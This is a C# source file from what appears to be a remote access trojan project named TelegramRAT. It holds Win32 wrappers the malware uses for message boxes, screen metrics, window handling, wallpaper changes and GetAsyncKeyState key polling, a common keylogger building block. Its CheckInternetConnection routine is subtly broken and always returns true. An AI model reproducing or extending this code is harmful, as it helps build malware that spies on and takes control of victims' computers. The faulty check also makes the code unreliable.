﻿using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;


namespace TelegramRAT
{
    static class NativeFunctionsWrapper
    {
        const string u32 = "user32.dll";


        [DllImport(u32, EntryPoint = "MessageBox")]
        static extern int MessageBox(IntPtr ParentWindow, string Text, string Caption, uint Type);

        public static int ShowMessageBox(string Text, string Caption)
        {
            return MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL);
        }

        public static int ShowMessageBox(string Text, string Caption, MsgBoxFlag Flag)
        {
            return MessageBox(GetForegroundWindow(), Text, Caption, (uint)MsgBoxFlag.MB_APPLMODAL | (uint)Flag);
        }

        public enum MsgBoxFlag : ulong
        {
            MB_APPLMODAL = 0x00000000L,
            MB_ICONINFORMATION = 0x00000040L,
            MB_ICONEXCLAMATION = 0x00000030L,
            MB_ICONQUESTION = 0x00000020L,
            MB_ICONSTOP = 0x00000010L,
            MB_YESNO = 0x00000004L
        }

        [DllImport(u32, EntryPoint = "GetSystemMetrics")]
        static extern int GetSystemMetrics(int index);

        enum MetricsIndexes : int
        {
            SM_CXSCREEN = 0,
            SM_CYSCREEN = 1,
            SM_CXFULLSCREEN = 16,
            SM_CYFULLSCREEN = 17,
            SM_CXVIRTUALSCREEN = 78,
            SM_CYVIRTUALSCREEN = 79
        }

        public static Rectangle GetScreenBounds()
        {
            return new Rectangle(0, 0, GetSystemMetrics((int)MetricsIndexes.SM_CXVIRTUALSCREEN), GetSystemMetrics((int)MetricsIndexes.SM_CYSCREEN));
        }


        [DllImport("wininet.dll", EntryPoint = "InternetGetConnectedState")]
        static extern bool GetInternetConnection(IntPtr flags, int reserved = 0);

        public static bool CheckInternetConnection()
        {
            IntPtr ptr = IntPtr.Zero;

            GetInternetConnection(ptr);

            long a = ptr.ToInt64();

            if ((a & 0x20) != 0x20)
            {
                return true;
            }
            return false;
        }

        [DllImport(u32, EntryPoint = "FindWindowA")]
        public static extern IntPtr FindWindow(string ClassName, string Caption);

        [DllImport(u32, EntryPoint = "GetForegroundWindow")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 0x01;
        public const int SPIF_SENDWININICHANGE = 0x02;


        [DllImport(u32, EntryPoint = "CloseWindow")]
        public static extern bool MinimizeWindow(IntPtr handle);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);

        [DllImport(u32, EntryPoint = "GetAsyncKeyState")]
        public static extern short GetAsyncKeyState(int key);

        

    }
}
